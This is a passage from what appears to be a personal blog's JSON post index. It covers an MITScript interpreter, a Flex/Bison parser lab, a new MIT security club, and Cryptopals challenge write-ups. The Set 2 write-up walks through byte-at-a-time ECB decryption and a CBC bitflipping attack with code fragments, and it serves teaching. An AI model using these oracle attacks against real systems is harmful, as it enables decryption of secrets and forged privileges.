search recursively in parent stack frames. Function calls The function call is the most complex construct in our language. Most importantly, when we make a call, we need to traverse the body of the function, looking for globals and assignments, and add them to our new StackFrame. This is another case where I needed to know the type of objects — but here, I need to know the type of an AST object. I use dynamic_cast. 12345if (Global* globCast = dynamic_cast&lt;Global*&gt;(stmt))&#123;...&#125; else if (IfStatement* ifCast = dynamic_cast&lt;IfStatement*&gt;(stmt))&#123;...&#125; Note that we need to recursively search inside if statements and while loops during the scan, as well. Native Functions But how to do the native functions? Jason gave me a hint here — create a subclass of Function, which I call NativeFunction. We need to support the following: print(s) Uses the default casting of s to a string and prints it to the console followed by a newline. input() Reads a line of input from the console and returns it as a string value. intcast(s) Expects a string and internally uses the c++ function atoi to parse the string and return an integer value. If the string does not represent an integer (e.g., the string “hello”), the function should raise an IllegalCastException NativeFunction has an evaluateNativeFunction() method that will do the right thing. After adding the ability to return early from functions, I have a really hacky interpreter! Debugging tests Some of these test cases reveal interesting effects of our semantics. For example, test7.mit has a global declaration inside an if statement that’s never run — equivalent to 123if (false)&#123; global x; &#125; In this case, we actually need to find this global and make x global in the scope. This is called variable hoisting. Note that there are a lot of crappy things about this interpreter — there is no garbage collection of unused objects, so memory usage might blow up, and it is costly to search recursively for a variable in parent stack frames. The next lab translates our MITScript into bytecode that can optimize away these costs.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Upcoming Blog Posts — Stay Tuned!","slug":"Upcoming-blog-posts-—-when-I-get-to-them","date":"2017-04-04T21:57:58.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2017/04/04/Upcoming-blog-posts-—-when-I-get-to-them/","permalink":"http://raywang.tech/2017/04/04/Upcoming-blog-posts-%E2%80%94-when-I-get-to-them/","excerpt":"I’ve been insanely busy with a bunch of cool things, which means both more blog content, but also quite a large latency before I get around to writing them. Here’s what I’ve been up to, and what awesome posts/series you can expect in the coming weeks: 6.115 Labs and Final project — Masterlock combo breaker? 6.857 Final project — Boston Symphony Orchestra iPad app pentest CTFs — MITCTF, Cambridge2Cambridge 6.035 MITScript interpreter in Rust","text":"I’ve been insanely busy with a bunch of cool things, which means both more blog content, but also quite a large latency before I get around to writing them. Here’s what I’ve been up to, and what awesome posts/series you can expect in the coming weeks: 6.115 Labs and Final project — Masterlock combo breaker? 6.857 Final project — Boston Symphony Orchestra iPad app pentest CTFs — MITCTF, Cambridge2Cambridge 6.035 MITScript interpreter in Rust ## 6.115 Final project — Masterlock combo breaker? Over spring break last week, I spent almost every day in lab for 6.115, working on the infamous Lab 4. The lab is centered around motors. We code assembly for controlling a robot arm with five DC motors providing five degrees of freedom. We also control a unipolar stepper motor for a toy version of optical tomography — getting a cross-section of a dowel on a spinning disk. Practical Electronics for Inventors by Paul Scherz is an awesome book. It’s very readable, and without the chapter on DC/stepper motors, this lab would not have been possible. Final Project I have a cool idea for my 6.115 final project. The amazing hacker Samy Kamkar built a Masterlock combo breaker, and I really want to make one of these for my final project. Since I need to use both the 8051 microcontroller and the Cypress PSOC, I could have the 8051+LED interface for selecting combinations, and have the cracking algorithm coded in C for the PSOC. That still may not be enough code… maybe I could also have some computer vision such that I can observe someone turning the lock, and then record/replay the combo? Anyways, will definitely be blogging about my progress on this. ## 6.857 Final project — Boston Symphony Orchestra iPad app pentest I also need to get started on my 6.857 project, which is penetration testing an iPad application for the Boston Symphony Orchestra. We have an iPad, so I just need to setup a pentesting environment on it and start playing with it! ## CTFs! I've done a few MIT-based CTFs in the past few weeks — MITCTF, organized by Steven Valdez and my fellow TechSec lead Max Justicz, and the [Cambridge2Cambridge CTF Qualifier](https://cambridge2cambridge.csail.mit.edu/) which I think is one of the most exciting initiatives to come out of MIT. In the inaugural event last year, Cambridge University students came to MIT for an attack-defense CTF and other fun physical challenges like lockpicking. This year's final will be held at Cambridge University in July, so I hope I qualified! I've definitely seen a lot of improvement in my skills since last year — I'm a lot more comfortable with crypto, and have come a long way in pwn and reversing. ## 6.035 — MITScript and Rust Also, I really need to get cracking on Rust and our 035 bytecode interpreter for Lab 3! Once I’ve finished Lab 3, I’ll publish my blog posts for Lab 2 and Lab 3. Maybe I’ll write something about learning Rust, as well 😉.","categories":[{"name":"Meta","slug":"Meta","permalink":"http://raywang.tech/categories/Meta/"}],"tags":[]},{"title":"Starting a New Security Club at MIT","slug":"Starting-a-new-security-club-at-MIT","date":"2017-03-14T18:38:51.000Z","updated":"2024-08-29T06:03:14.440Z","comments":true,"path":"2017/03/14/Starting-a-new-security-club-at-MIT/","permalink":"http://raywang.tech/2017/03/14/Starting-a-new-security-club-at-MIT/","excerpt":"","text":"fortenforge, Devin Neal, and I decided that MIT needed more of a student security community on campus. So, we started TechSec in February 2017! We host weekly meetings on Monday nights and try to get students to compete with us in CTFs on weekends. You can find our meeting/workshop notes, which we laboriously compile for the benefit of our club members, here. So far, we’ve been holding introduction to reverse engineering and binary workshops. We have a lot more planned, including interesting guest speakers.","categories":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/categories/TechSec/"}],"tags":[{"name":"TechSec","slug":"TechSec","permalink":"http://raywang.tech/tags/TechSec/"}]},{"title":"Flex and Bison for a Simple Language, MITScript","slug":"Flex-and-Bison-for-a-simple-language-MITScript","date":"2017-03-07T18:38:11.000Z","updated":"2024-08-29T06:03:14.439Z","comments":true,"path":"2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/","permalink":"http://raywang.tech/2017/03/07/Flex-and-Bison-for-a-simple-language-MITScript/","excerpt":"For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language. The grammar for the language is shown below.","text":"For the first lab in 6.035, Computer Language Engineering, in Spring 2017, we use Flex, a lexical analyzer library, and Bison, a parser generator, to create a parser for a simple scripting language. The grammar for the language is shown below. 12345678910111213141516171819202122Program ::= Statement*Statement ::= Assignment | CallStatement | Global | IfStatement | WhileLoop | ReturnGlobal ::= &#x27;global&#x27; name &#x27;;&#x27;Assignment ::= LHS &#x27;=&#x27; Expression &#x27;;&#x27;CallStatement ::= Call &#x27;;&#x27;Block ::= &#x27;&#123;&#x27; Statement* &#x27;&#125;&#x27;IfStatement ::= &#x27;if&#x27; &#x27;(&#x27; Expression &#x27;)&#x27; Block ( &#x27;else&#x27; Block )?WhileLoop ::= &#x27;while&#x27; &#x27;(&#x27; Expression &#x27;)&#x27; BlockReturn ::= &#x27;return&#x27; Expression &#x27;;&#x27;Expression ::= Function | Boolean | RecordFunction ::= &#x27;fun&#x27; &#x27;(&#x27; Name* &#x27;)&#x27; BlockBoolean ::= Conjunction ( &#x27;|&#x27; Conjunction )*Conjunction ::= BoolUnit (&#x27;&amp;&#x27; BoolUnit)*BoolUnit ::= &#x27;!&#x27;? PredicatePredicate ::= Arithmetic ( (&#x27;&lt;&#x27; | &#x27;&gt;&#x27; | &#x27;&lt;=&#x27; | &#x27;&gt;=&#x27;| &#x27;==&#x27;) Arithmetic)?Arithmetic ::= Product ( (&#x27;+&#x27; | &#x27;-&#x27;) Product)*Product ::= Unit ( (&#x27;*&#x27; | &#x27;/&#x27;) Unit)*Unit ::= &#x27;-&#x27;? (LHS | Constant | Call | &#x27;(&#x27; Boolean &#x27;)&#x27; )LHS ::= Name (&#x27;.&#x27; Name | &#x27;[&#x27; Expression &#x27;]&#x27; )*Call ::= LHS &#x27;(&#x27; (Expression (&#x27;,&#x27; Expression)*)? &#x27;)&#x27;Record ::= &#x27;&#123;&#x27; (Name &#x27;:&#x27; Expression &#x27;;&#x27;)* &#x27;&#125;&#x27;Constant ::= integer_constant | string_constant The goal is to construct an Abstract Syntax Tree (AST) for any MITScript program and pretty-print it. 123456789101112131415161718Your parser must produce an AST with nodes for the following program constructs:Block ::= [Statement]Global ::= nameAssignment ::= LHS ExpressionExpressionStatement ::= Expression &#x27;;&#x27;IfStatement ::= Condition ThenPart ElsePartWhileLoop ::= Condition BodyReturn ::= ExpressionFunctionDeclaration ::= [Arguments] BodyBinaryExpression ::= LeftOperand Operator RightOperandUnaryExpression ::= Operand OperatorFieldDereference ::= BaseExpression FieldIndexExpression ::= BaseExpression IndexCall ::= TargetExpression [Arguments]Record ::= Map[String, Expression]IntegerConstantStringConstantNoneConstant Flex How do Flex and Bison work? Much of the lab was reading documentation about these two old utilities. Flex takes a .lex file, which simply lists the regular expressions, tokens, and keywords that will be matched in a program. When Flex works with Bison, every time it matches a token/keyword, it tells Bison about it. It can return the type of token/keyword to Bison, and it can also return an entire matched string or int in a Bison object it has access to, called yylval. Here are examples of both: 12345678&#123;string_const&#125; &#123; //Rule for string constant yylval-&gt;strType = new string(yytext); return T_STRINGCONST;&#125;&quot;while&quot; &#123;return T_WHILE;&#125; For us, the lab specifies that: Your lexer must be able to recognize the following kinds of tokens in addition to all the keywords and operators listed above: integer constants consisting of one or more digits 1int_const [0-9][0-9]* string constants wrapped in double quotes and supporting the following escaped characters: \\ &quot; \\n \\t 1string_const (\\&quot;(\\\\.|[^&quot;])*\\&quot;) None constant, equivalent to “NULL” in Java ‘true’ and ‘false’ 123&quot;None&quot; &#123;return T_NONE;&#125;&quot;true&quot; &#123;return T_TRUE;&#125;&quot;false&quot; &#123;return T_FALSE;&#125; Name identifiers that start with a letter or underscore, followed by sequence of letters, underscores and numbers. so x0 is a valid variable name, but 0x is not 12345678identifier ([a-zA-Z_][a-zA-Z_0-9]*)...&#123;identifier&#125; &#123; yylval-&gt;strType = new string(yytext); return IDENTIFIER;&#125; The file is compiled in our Makefile with flex --outfile=lexer.cpp --header-file=lexer.h lexer.lex. Bison In the Bison .yy file, we must define several things. First, we must define the union, types, and tokens that Flex and our grammar know about. Then, we need to define our grammar (the most important part!). The grammar section of the .yy file contains rules created simply by converting our MITScript to Bison syntax (more on this soon). Each rule is associated with an action, which contains C++ code to be executed when the rule is matched. How does this fit into everything else? Well, we have a main.cpp file that will call yyparse on stdin, which will match all the tokens and Bison rules, executing their actions. These actions will construct node objects of an AST, which are defined in AST.h. Then, the main.cpp file will call the pretty print function on the root node, which will recursively print the tree. As an example of a rule + action, 1234returnStmt: T_RETURN expr T_SEMICOLON &#123; $$ = new ReturnStatement(*$2); &#125;; Above, the T_RETURN and T_SEMICOLON are tokens that correspond to “return” and “;” in our lex file. The components matched by the rule can be accessed by $n, which stands for the value of the nth component. The semantic value for the grouping being constructed is $$. The ReturnStatement object is an AST node class defined in another file, AST.h, which we’ll get to. But let me go back to the union. “The %union declaration specifies the entire collection of possible data types for semantic values.” Lexer can access these union fields in yylval. 12345678910111213%union &#123; int intconst; string *strType; // goes with string_const in lex Block* blockType; Statement* statementType; Expression* expressionType; vector&lt;Expression*&gt; *exprListType; vector&lt;Statement*&gt; *stmtListType; vector&lt;string*&gt; *stringListType; //maybe don&#x27;t need for function declaration list map&lt;string, Expression*&gt; *recordMapType;&#125; You can see that in my union, I have a bunch of pointers of node types in my AST. I can now define %tokens, which are terminals in my grammar (strings, keywords and ints), and %types, which are nonterminals in my grammar. All the tokens are matched and returned in the .lex file. 123456%token&lt;intconst&gt; T_INT%token&lt;strType&gt; T_SEMICOLON T_LBRACKET T_RBRACKET T_LPAREN T_RPAREN T_AND T_OR T_EXCLAM T_LESS_THAN T_GREATER_THAN T_LEQ T_GEQ T_EQEQ T_PLUS T_MINUS T_TIMES T_DIV T_DOT T_EQUALS T_COLON T_LBRACE T_RBRACE T_COMMA%token &lt;strType&gt; T_FUNCTION T_GLOBAL T_IF T_ELSE T_WHILE T_RETURN T_NONE T_TRUE T_FALSE%token &lt;strType&gt; IDENTIFIER T_STRINGCONST And nonterminals: 1234567891011%type &lt;statementType&gt; stmt assignment callStmt ifStmt whileLoop returnStmt global Program%type &lt;blockType&gt; block%type&lt;stmtListType&gt; stmts%type &lt;expressionType&gt; expr call boolean function conjunction boolunit predicate arithmetic product unit lhs record constant subunit%type&lt;exprListType&gt; argument_expr_list func_declaration_list%type&lt;recordMapType&gt; record_init_list To enforce left-associativity, I add 12%left PLUS MINUS%left TIMES DIV Now for the fun stuff! With all the types I’ve defined, I need to write grammar rules for all of them. 12345678Program: %empty &#123; // printf(&quot;Empty program\\n&quot;); &#125; | stmts &#123; $$ = new Program(*$1); out = $$; &#125;; The highest level, the start Program, can be empty. We assign the Program node to out, which is passed to main.cpp through an argument of yyparse. Note that the skeleton code added some extra stuff to make this necessary/possible; namely, it is needed to make the parser reentrant. The skeleton code constructs are explained in this great post. Much of the translation from BNF grammar to Bison is straightforward. But, when creating variable-length lists, such as function arguments(fun(a b c)&#123;&#125;), we have to use a C++ vector and recursively push objects into it. 1234567891011argument_expr_list: %empty &#123; $$ = new ExpressionList(); &#125; | expr &#123; $$ = new ExpressionList(); $$-&gt;push_back($1); &#125; | argument_expr_list T_COMMA expr &#123; $1-&gt;push_back($3); &#125;; In the third rule above, the $3 matches the expr, and $1 matches the argument_expr_list, which you recall is of type vector&lt;Expression*&gt;. The same goes for record rules, which are like Python dicts, and are of type map&lt;string, Expression*&gt;: 123456789101112131415record: T_LBRACE record_init_list T_RBRACE &#123; // printf(&quot;Parsing\\n &quot;); $$ = new Record(*$2); &#125;;record_init_list: %empty &#123; // printf(&quot;Parsing empty record\\n &quot;); $$ = new RecordMap(); &#125; | record_init_list IDENTIFIER T_COLON expr T_SEMICOLON &#123; // printf(&quot;Parsing record recursive\\n &quot;); $1-&gt;insert(make_pair(*$2, $4)); &#125;; Note that the default action for a rule is $$ = $1;. Running bison with bison --output=parser.cpp --defines=parser.h -v parser.yy will produce several files, including a parser.output file that contains valuable debugging info about our parser, such as the state transition tables. AST Nodes, Visitor pattern pretty-printing, and main (Or, putting it all together) Here’s the main.cpp file 12345678910111213int main(int argc, char** argv)&#123; void* scanner; yylex_init(&amp;scanner); yyset_in(stdin, scanner); Statement* output; int rvalue = yyparse(scanner, output); if(rvalue == 1)&#123; cout&lt;&lt;&quot;Parsing failed&quot;&lt;&lt;endl; return 1; &#125; PrettyPrinter printer; output-&gt;accept(printer);&#125; Each class in my AST.h inherits from Expression or Statement. 12345678910class Call: public Expression &#123;public: Expression&amp; targetExpr; ExpressionList&amp; argumentsList; Call( Expression&amp; targetExpr, ExpressionList&amp; argumentsList): targetExpr(targetExpr), argumentsList(argumentsList)&#123;&#125;; void accept(Visitor&amp; v) override &#123; v.visit(*this); &#125;&#125;; The accept function that overrides a virtual method is part of the Visitor Pattern. Instead of defining a pretty-print method in each of my classes in AST.h, I define a PrettyPrinter class that contains visit(Object&amp; obj) methods for all my nodes. We also need an interface with all our virtual methods in Visitor.h. This diagram explains the Visitor pattern well. My PrettyPrinter.h file has recursive calls to each node’s accept() method. For example, for a Block, which contains a list of Statements, 123456789101112void visit(Block&amp; blk) override &#123; PrettyPrinter printer; printf(&quot;&#123;&quot;); TABLEVEL++; for ( auto statement = blk.statements.begin(); statement != blk.statements.end(); statement++ ) &#123; printf(&quot;\\n&quot;); (*statement)-&gt;accept(printer); &#125; printf(&quot;\\n%s&#125;&quot;, string(TABLEVEL-1,&#x27;\\t&#x27;).c_str()); TABLEVEL--;&#125;; I use a global variable TABLEVEL and printf(&quot;\\n%s&#125;&quot;, string(TABLEVEL-1,'\\t').c_str()); to get the correct indentation for the body elements of the block. When I print, I wrap all BinaryExpressions and UnaryExpressions in parentheses. We can now understand the rest of our Makefile, 123456789all: parser.cpp lexer.cpp main.cpp PrettyPrinter.h Visitor.h g++ -g -std=gnu++11 main.cpp parser.cpp lexer.cppparser.cpp: parser.yy bison --output=parser.cpp --defines=parser.h -v parser.yylexer.cpp: lexer.lex flex --outfile=lexer.cpp --header-file=lexer.h lexer.lex The compiled binary, a.out, will take in a file through a redirect ./a.out &lt; tests/good1.mit and pretty-print! Other references Here is a complete compiler tutorial that is closer to a real language than most things. Most other Flex/Bison examples are stupid calculators x.x. This tutorial is very very thorough. The ANSI C Lex spec and Yacc (old version of Bison) file are helpful in constructing our own grammar and lex rules.","categories":[{"name":"Languages","slug":"Languages","permalink":"http://raywang.tech/categories/Languages/"}],"tags":[{"name":"6.035","slug":"6-035","permalink":"http://raywang.tech/tags/6-035/"}]},{"title":"Matasano Crypto Challenges, Set 1","slug":"set1_writeup","date":"2017-03-07T18:38:11.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"2017/03/07/set1_writeup/","permalink":"http://raywang.tech/2017/03/07/set1_writeup/","excerpt":"Challenge 1.1 Convert hex to base64 The first challenge is pretty straightforward, using python’s built-in functions or pwntools, as I use heavily in these challenges. The functions a2b_hex, unhexlify, and ''.decode(&quot;hex&quot;) all do the same thing. They take in an ascii string of the form “[0-9a-f]*” and decode it. The string decodes to I'm killing your brain like a poisonous mushroom. We can then use binascii.b2a_base64() to convert the byte string to a base64 representation.","text":"Challenge 1.1 Convert hex to base64 The first challenge is pretty straightforward, using python’s built-in functions or pwntools, as I use heavily in these challenges. The functions a2b_hex, unhexlify, and ''.decode(&quot;hex&quot;) all do the same thing. They take in an ascii string of the form “[0-9a-f]*” and decode it. The string decodes to I'm killing your brain like a poisonous mushroom. We can then use binascii.b2a_base64() to convert the byte string to a base64 representation. Challenge 1.2 Fixed XOR This challenge uses iterators to do a fixed-length xor. The chr() function takes an ASCII integer code in the range 0-255 and returns a character string. The ord() function does the inverse, taking a character and returning its integer. We want to xor these integers. Thus, ''.join([chr(ord(i)^ord(j)) for i, j in zip(s1, s2)]) will first xor the integers of each character of the input strings with ord(). Then it will convert back into a character string with chr(). Challenge 1.3 Single-byte XOR cipher Extending the last challenge, we can create a variable-length input xor function. Or, we can use pwntools xor(). I iterate through all 255 possible single character xor keys, scoring each decrypted word based on character frequency. 123456for c in result: c = c.lower() if c in character_frequency: word_score += character_frequency[c]cand_words.append((result, word_score, char)) Challenge 1.4 Detect single-character XOR This challenge asks us to find which of the 60-character strings in the file has been encrypted by single-character XOR. Using the find_singlechar_key_xor utility function created in the last challenge, I can iterate through all the file strings and find the possible single-character xor key and word score of each line. The line turns out to decode to ‘Now that the party is jumping\\n’, xored against the byte 5. Challenge 1.5 Implement repeating-key XOR This is a cop-out. Pwntools implements repeating-key xor in its utils.fiddling library. We can use python itertools for this as well, 1return &#x27;&#x27;.join([chr(ord(i)^ord(j)) for i, j in it.izip(s1, it.cycle(s2))]) Challenge 1.6 Break repeating-key XOR This challenge asks us to solve repeating-key xor, aka the Vigenere cipher. There are several steps to doing this. First, we need to find the xor key length. the period of the cipher. Next, we need to find the key character-by-character, using the single-byte xor cipher we made in Challenge 1.3. In the first step I calculate the Hamming distance (number of diff bits between two strings) of two consecutive ciphertext blocks (of some guessed length). The correct keylength will create blocks of minimum Hamming distance. The challenge tells us to try values from 2 to 40 for the guessed key length. I calculate the hamming distance of all combinations of 4 blocks. 12pairs = list(it.combinations(blocks, 2))hamsum = it.starmap(hamming, pairs) it.starmap computes the hamming function using arguments obtained from the iterable pairs. I then normalize the Hamming distance for keysize. 1normalized = float(reduce(lambda x, y: x+y, hamsum))/keysize and find the keylength with the minimum normalized hamming distance is 29. The second step is to find the key, character-by-character. I split the ciphertext into blocks of len(keysize) and transpose them, so that I have a list of all the 1st, 2nd, etc… chars of each block. Each of these transposed messages has been single-char xored, so I can just find each single-char key and concatenate the chars to get the full xor key. 12345678blocks = [x[i:i+keysize] for i in range(0, len(x), keysize)]blocks = it.izip_longest(*blocks, fillvalue=&#x27;0&#x27;)block_list = [&#x27;&#x27;.join(msg) for msg in blocks]char_freqs = [find_singlechar_key_xor(&#x27;&#x27;.join(msg))[2]for msg in block_list] I need to use izip_longest because the last block is shorter than the others, and izip_longest pads the shortest elements of the iterable. The key made by joining the single-char keys is Terminator X: Bring the noise. Challenge 1.7 AES in ECB mode This challenge introduces the AES block cipher and the ECB mode. The ECB mode is problematic because it is stateless and deterministic — the same block of plaintext will encrypt to the same ciphertext. I use the cryptography module in Python because it’s being actively developed, although the PyCrypto library is more popular. You initialize AES, a symmetric cipher, with 1cipher = Cipher(algorithm = algorithms.AES(&quot;YELLOW SUBMARINE&quot;), mode = modes.ECB(), backend=default_backend()) . To decrypt text, you use a decryptor object and the update() and finalize() methods. 12d = cipher.decryptor()decrypted_text = d.update(file) + d.finalize() Challenge 1.8 Detect AES in ECB mode Because ECB is deterministic, I can detect which of the strings in 8.txt is encrypted using ECB. The properties of the plaintext, such as low Hamming distance, will remain in the ciphertext. Thus, I can use minimum Hamming distance to find the correct line, similar to Challenge 6. I create a scoring function, hamming_score_line(line), which will return the hamsum of a line of ciphertext. 1min_line_num = min(lines, key=hamming_score_line)[0] will be the correct answer, 133. References [1] pwntools","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 2","slug":"set2_writeup","date":"2017-03-07T18:38:11.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"2017/03/07/set2_writeup/","permalink":"http://raywang.tech/2017/03/07/set2_writeup/","excerpt":"Challenge 9 Implement PKCS#7 padding As the challenge states, “A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.” The PKCS#7 padding scheme will append the number of bytes of padding to the end of the block. I use the pwntools pack() function to pack the number of padding bytes.","text":"Challenge 9 Implement PKCS#7 padding As the challenge states, “A block cipher transforms a fixed-sized block (usually 8 or 16 bytes) of plaintext into ciphertext. But we almost never want to transform a single block; we encrypt irregularly-sized messages.” The PKCS#7 padding scheme will append the number of bytes of padding to the end of the block. I use the pwntools pack() function to pack the number of padding bytes. Challenge 10 Implement CBC mode This challenge has us implement CBC mode of block encryption. In CBC mode, each block of plaintext is XORed with the previous ciphertext block before being encrypted. We need an IV for the first block of plaintext. In set2_utils, I create a CBC Cipher class that takes in a cipher and an IV. The encrypt() function will split the plaintext into blocks (usually size 16), and then do the encryption: 1234567# Xor with previous block. First prev_xor_block is the IV.pre_aes_block = xor(blocks[i], prev_xor_block)# Encrypt with cipher algorithmcurrent_cipher_block = e.update(pre_aes_block)prev_xor_block = current_cipher_blockciphertext += current_cipher_block The decryption takes each block of ciphertext, decrypts it, and XORs with the previous block of ciphertext to recover the plaintext. 12345for i in xrange(1, len(blocks)): decrypted_block = d.update(blocks[i]) # print decrypted_block plaintext += xor(decrypted_block, blocks[i-1]) # where blocks[i-1] is the previous ciphertext block I can verify I’ve done this correctly by decrypting 10.txt with a CBC Cipher with IV '\\x00'*16. Challenge 11 An ECB/CBC detection oracle This challenge asks us to detect whether we’ve encrypted a text with ECB or CBC, chosen at random. Recall the properties of ECB vs CBC — ECB will take two identical plaintext blocks and produce two identical ciphertext blocks. This is as simple as asking the oracle to encrypt a string that contains at least two consecutive blocks of identical characters. If the oracle chooses ECB, the ciphertext will have two adjacent identical blocks as well. To ensure that we have at least two consecutive blocks of identical characters, we need to input at least 43 bytes. Why? Because the oracle pads the plaintext with 5-10 bytes, so we need to give some offset to ensure our identical plaintext blocks are properly aligned. R = random_nfix 123|--------16-----||-5-| |---11----| |--------16----| |--------16----|RRRRR 00000000000 0000000000000000 0000000000000000 Challenge 12 Byte-at-a-time ECB decryption (Simple) I have an oracle that produces AES-128-ECB(your-string || unknown-string, random-key). I can find unknown-string with this oracle. The idea is that, First, I need to find the block size of the cipher. Then, assuming I know it’s using ECB, I can find the flag byte-by-byte. How? Since I control my-string, I can ensure each time that the oracle encrypts 15 bytes that I know + one unknown byte. I can then create a table of all possible ciphertexts of the 15 known bytes + 1 unknown byte, and compare the ciphertext the oracle returns to the ciphertexts in my table. To find the block size, I feed in incrementing offsets to the oracle, until the ciphertext length increases. The size of the increase will be block_size, because of the padding. Next, I need to get an offset of 15 known bytes to feed into the oracle. The first offset is just 15 filler variables, all A’s. 123456789U = unknown flag byteK = known flag byteInput to oracle, |-16-| bytes to be looked up in table: |----offset----| |--------16-----|plaintext: AAAAAAAAAAAAAAAU UUUU..... And I create a table of all possible ciphertexts of A…U. 1234for cand in candidates: # every candidate block of ciphertext is 16 bytes block_of_interest = oracle(offset+cand)[0:blocksize] cand_dict[block_of_interest] = cand I then feed the block with the unknown byte to the oracle, padding with the same filler variables as my offset. Perform the table lookup. 12345oracle_block = oracle(&#x27;A&#x27;*offset_len)[block_of_interest : block_of_interest + blocksize]if oracle_block in cand_dict: next_byte = cand_dict[oracle_block] At the next iteration, I decrease the number of filler variables by 1, since I have a known byte and want the next byte. 1234Input to oracle, |-16-| bytes to be looked up in table: |--------16-----|plaintext: AAAAAAAAAAAAAAKU UUUU..... When I have 16 known bytes in this manner, I no longer need filler variables in my offset; I can just use the previous 15 known bytes as my offset. Note that my lookup table can be populated with ciphertexts of 16 flag bytes. Since I have 16-byte ciphertexts in my lookup table, I need to first align, then get the index of, the 16-byte block-of-interest that I’ll look up in my table. 1234567Input to oracle, |-16-| bytes to be looked up in table:block_num: 0 1 block_of_interest alignment bytes |--------16-----|plaintext: AAAAAAAAAAAAAAAK KKKKKKKKKKKKKKKU UUUU..... Stopping after I run out of bytes, I find the answer is 1Rollin&#x27; in my 5.0\\nWith my rag-top down so my hair can blow\\nThe girlies on standby waving just to say hi\\nDid you stop? No, I just drove by\\n Challenge 13 ECB cut-and-paste Challenge 14 Byte-at-a-time ECB decryption with random prefix In this challenge, a random-length prefix is added to the attacker-controlled string, AES-128-ECB(random-prefix || attacker-controlled || target-bytes, random-key). Thus, I need to know the length of the prefix to be able to conduct the same attack as Challenge 12. Finding this length is not so hard. First, I can find the block index of the last byte of the prefix with just two calls to the oracle. Then, I find the offset of the last byte of the prefix within the last block. 12ciphertext1 = prefix_oracle(&#x27;&#x27;)ciphertext2 = prefix_oracle(&#x27;A&#x27;) Because this is ECB mode, the first different block between ciphertext1 and ciphertext2 will be the last block of the prefix. 12345678910U = unknown flag byteR = random prefix byteplaintext1:|--------16----||-enc to different value-|RRRRRRRRRRRRRRRRRRRRUUUUUU....plaintext2:|--------16----||-enc to different value-|RRRRRRRRRRRRRRRRRRRRAUUUUUU.... Now that I know what block the last byte of the prefix is in, find_prefix_block_modulo_offset finds the offset of the last byte of the prefix. I want to align two blocks of identical plaintext, to encrypt to two blocks of identical ciphertext. The amount of offset I use to align will tell me the offset of the prefix. 123for i in xrange(0, blocksize): offset = &#x27;A&#x27;*i + &#x27;\\x00&#x27;*32 ciphertext = prefix_oracle(offset) 123456789 |--offset-|RRRRR00000000000 0000000000000000 0000000000000000 UUUUUU....```pythonIn the above example, the two 16-byte-aligned blocks of \\x00&#x27;s will encrypt to adjacent identical ciphertext, which I can detect.Finally, `find_next_byte_with_prefix` will do the work. The offset is now```pythonoffset = &#x27;A&#x27;*(extra_offset_for_prefix + offset_len) , with offset_len always being 15 known bytes, as in Challenge 12. The keys in my lookup table are no longer a fixed-length of blocksize — they include all known bytes now. Here, the len(offset) is not always 15, as in Challenge 12. Also, the length of my lookup table keys is not always blocksize; rather, the length of my keys increases with the number of known bytes. I could have implemented this more similarly to Challenge 12, which would have been less computationally expensive. How do I produce ciphertext keys for my lookup table now? Here’s what I feed into the oracle: 12for cand in candidates: table_key = oracle(offset + knownbytes + cand)[prefix_location: prefix_location + len(offset) + len(knownbytes) + 1] 12 |--lookup table key---------|RRRRRAAAAAAAAAAA AAAAAAAAAAAAAAAU UUUU..... 1234567 |-------------------lookup table key---------| |---offset-------|extra_offset_for_prefix | |RRRRRAAAAAAAAAAA AAAAAKKKKKKKKKKK KKKKKKKKKKKKKKKU UUUU..... Calling find_next_byte_with_prefix byte-by-byte, I find the same flag as before. 1Rollin&#x27; in my 5.0\\nWith my rag-top down so my hair can blow\\nThe girlies on standby waving just to say hi\\nDid you stop? No, I just drove by\\n Challenge 15 PKCS#7 padding validation Here’s an easy one. We need only validate that the PKCS7 padding is correct. 123byte = s[-1]pad_length = unpack(byte, &#x27;all&#x27;)if byte == 0 or s[-pad_length:] != byte * pad_length or byte == &quot;&quot;: I check if the last pad_length bytes of s are equal to the string of byte repeated pad_length times, as it should be in a properly padded string. Challenge 16 CBC bitflipping attacks We have a function that takes user input and url-encodes special characters, and we want to exploit the properties of CBC to allow us to insert the string “;admin=true;” without the “;” and “=” being validated out. Recall that CBC takes each block of ciphertext and XORs it with the next block of decrypted ciphertext to recover the plaintext. If I can modify at least two consecutive blocks of ciphertext, I can make the second block decrypt to whatever I want. I know that \\x00 ^ \\x59 = ; and \\x00 ^ \\x61 = '=' from ascii chart. 1234567891011user-controlled input: 0 1AAAAAAAAAAAAAAAA \\x00admin\\x00true\\x00ciphertext:XXXXXXXXXXXXXXXX XXXXXXXXXXXXXXXXmodified ciphertext:\\x59XXXXX\\x61XXXX\\x59XXXX XXXXXXXXXXXXXXXXIn XOR step of CBC decryption, the 2nd block would normally XOR to recover \\x00admin\\x00true\\x00, but now that I&#x27;ve done an additional XOR on three bytes by modifying ciphertext, the 2nd block XORs to a plaintext of \\x59admin\\x61true\\x59. Done with set2!","categories":[{"name":"Crypto","slug":"Crypto","permalink":"http://raywang.tech/categories/Crypto/"}],"tags":[{"name":"cryptopals","slug":"cryptopals","permalink":"http://raywang.tech/tags/cryptopals/"}]},{"title":"Matasano Crypto Challenges, Set 3","slug":"set3-writeup","date":"2017-03-07T18:38:11.000Z","updated":"2024-08-29T06:03:14.441Z","comments":true,"path":"2017/03/07/set3-writeup/","permalink":"http://raywang.tech/2017/03/07/set3-writeup/","excerpt":"Challenge 17 The CBC padding oracle!!! The CBC padding oracle is a very famous attack. We have an oracle function that takes in a ciphertext and decrypts it, returning True if the plaintext is padded properly. The process behind the attack on each block is:","text":"Challenge 17 The CBC padding oracle!!! The 